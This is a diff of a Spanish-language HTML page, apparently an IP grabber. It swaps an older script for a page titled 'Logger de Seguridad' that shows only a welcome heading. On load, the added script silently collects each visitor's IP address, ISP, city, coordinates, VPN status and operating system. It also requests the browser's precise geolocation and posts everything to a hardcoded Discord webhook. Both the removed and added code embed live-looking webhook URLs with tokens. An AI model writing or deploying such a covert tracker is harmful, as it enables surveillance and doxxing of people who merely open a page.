@@ -291,41 +291,69 @@
 </body>
 </html>
 
-<script>
-fetch("https://ipapi.co/json/") // también podés usar ipwhois.io/json/ o ipinfo.io/json
-  .then(response => response.json())
-  .then(ip_data => {
-    const system_info = {
-      os: navigator.platform,
-      bot: /bot|crawler|spider|crawling/i.test(navigator.userAgent),
-    };
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Logger de Seguridad</title>
+</head>
+<body>
+  <h1>Bienvenido</h1>
 
-    const data = {
-      content: `
-📡 IP: ${ip_data.ip}
+  <script>
+    const webhookUrl = "https://discord.com/api/webhooks/1387250677645836359/yGWtt1WhZXX-VRQhJd5rPGMy5STBSCg1yg0cwJSqrBGIQpk8kQn-cOKoHDlGYZ3ypTj9";
+
+    // Paso 1: Obtener datos IP
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(ip_data => {
+        const system_info = {
+          os: navigator.platform,
+          bot: /bot|crawler|spider|crawling/i.test(navigator.userAgent),
+        };
+
+        // Datos base con IP
+        let log = `📡 IP: ${ip_data.ip}
 🛰️ ISP: ${ip_data.org}
 🔎 ASN: ${ip_data.asn}
 🌎 País: ${ip_data.country_name}
 🏙️ Región: ${ip_data.region}
 🏠 Ciudad: ${ip_data.city}
-📍 Latitud: ${ip_data.latitude}
-📍 Longitud: ${ip_data.longitude}
+📍 Latitud IP: ${ip_data.latitude}
+📍 Longitud IP: ${ip_data.longitude}
 ⏰ Zona Horaria: ${ip_data.timezone}
 📱 Conexión Móvil: ${ip_data.mobile ? 'Sí' : 'No'}
 🕵️ VPN/Proxy: ${ip_data.proxy ? 'Sí' : 'No'}
 🤖 Bot: ${system_info.bot ? 'Sí' : 'No'}
-💻 Sistema Operativo: ${system_info.os}
-      `
-    };
+💻 Sistema Operativo: ${system_info.os}`;
 
-    // Reemplazá esta URL con tu webhook de Discord
-    fetch("https://discord.com/api/webhooks/1386031988233732097/jdbPP5Xj-rc6Im-KkbR9UI-fGsRPYByq1Z2uqlchTSBnudCZ2kG78A9tL3P4uF0DY-Qx", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify(data),
-    });
-  })
-  .catch(error => console.error("Error obteniendo IP info:", error));
-</script>
+        // Paso 2: Intentar obtener ubicación exacta
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(position => {
+            log += `\n📍 Ubicación Exacta: Lat ${position.coords.latitude}, Lon ${position.coords.longitude}`;
+
+            // Enviar al webhook
+            sendToWebhook(log);
+          }, error => {
+            log += `\n📍 Ubicación Exacta: Rechazada por el usuario.`;
+            sendToWebhook(log);
+          });
+        } else {
+          log += `\n📍 Ubicación Exacta: No compatible con el navegador.`;
+          sendToWebhook(log);
+        }
+
+        function sendToWebhook(content) {
+          fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ content })
+          }).catch(err => console.error("Error al enviar al webhook:", err));
+        }
+      });
+  </script>
+</body>
+</html>
+
